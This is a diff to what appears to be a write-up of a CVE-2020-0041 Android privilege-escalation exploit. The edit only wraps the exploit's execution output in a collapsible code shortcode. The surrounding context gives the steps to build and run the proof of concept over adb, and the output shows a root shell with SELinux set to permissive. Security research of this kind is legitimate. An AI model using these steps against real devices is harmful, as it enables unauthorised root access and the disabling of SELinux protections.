@@ -97,7 +97,7 @@ OFFSET_PIPE_FOP
 
 >The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
 
-```bash
+{{< code language="bash" title="Exploit execution output" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -138,7 +138,7 @@ uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 root_by_cve-2020-0041:/ # getenforce
 Permissive
 root_by_cve-2020-0041:/ # 
-```
+{{< /code >}}
 
 ## Improvements
 
